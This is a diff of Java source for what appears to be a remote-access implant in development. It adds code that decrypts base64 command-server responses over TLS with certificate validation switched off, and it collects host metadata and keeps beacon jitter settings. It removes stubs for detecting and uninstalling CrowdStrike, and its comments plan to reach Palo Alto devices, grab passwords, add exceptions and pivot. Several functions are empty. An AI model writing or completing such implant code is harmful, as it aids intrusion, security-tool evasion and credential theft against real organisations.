@@ -12,7 +12,7 @@ import java.util.Hashtable;
 import java.util.UUID;
 import java.util.Arrays;
 import java.util.Base64;
-import java.util.UUID;
+//import java.util.UUID;
 import org.w3c.dom.Document;
 import org.w3c.dom.Element;
 import org.w3c.dom.Node;
@@ -68,7 +68,6 @@ class nConfig
     public static int isKeystone = 0;
     public static int stutterMin = 10;
     public static int stutterMax = 50;
-    public static String struck = "false";
     public static String passMat = "T__+Pmv.REW=u9iXBB-";
     public static Hashtable endpoints = new Hashtable(){
         {
@@ -98,11 +97,6 @@ public class nCore
             cm.spoliate();
         }
 
-        //check if crowdstrike is installed and attempt uninstall if it is
-        if (cm.getCStrike())
-        {
-            nConfig.struck = String.valueOf(cm.counterStrike());
-        }
 
         modLib.getUpdate();
 
@@ -168,6 +162,8 @@ public class nCore
             class cancer
             {
                 //currently empty, populated when modules updated
+                //figure out how to get onto palos, grab passwords, add exceptions, and pivot
+                //figure out rmi/ndwp?? jmx??
             }
         }
 
@@ -186,7 +182,6 @@ public class nCore
                 metadata.put("jre",System.getProperty("java.runtime.version"));
                 metadata.put("interfaces",nUtil.getAddress().toString());
                 metadata.put("hostname",nUtil.getHostname());
-                metadata.put("crowdstruck",nConfig.struck);
                 metadata.put("uuid",sessUUID);
 
                 return nUtil.outputToXmlDoc("metadata",metadata);
@@ -358,6 +353,7 @@ public class nCore
         {
             //stackoverflow provided boilerplate
             security secInst = new security();
+            utilitarian nUtil = new utilitarian();
 
             SSLContext sslCon = SSLContext.getInstance("TLS");
             sslCon.init(null, new TrustManager[] {new InvalidCertificateTrustManager()}, null);
@@ -398,10 +394,13 @@ public class nCore
 
                 if (connMan.getResponseCode() == HttpsURLConnection.HTTP_OK)
                 {
-                    byte[] secInst.decrypt(
-                        
-                    )
-
+                    byte[] decodedResponseData = secInst.decrypt(
+                        Base64.getDecoder().decode(
+                            connMan.getResponseMessage()
+                        ),
+                        nonce.getBytes()
+                    );
+                    return new String(decodedResponseData);
                 }
                 else
                 {
@@ -447,16 +446,6 @@ public class nCore
         }
 
         private boolean spoliate()
-        {
-
-        }
-
-        private boolean counterStrike()
-        {
-
-        }
-
-        private boolean getCStrike()
         {
 
         }
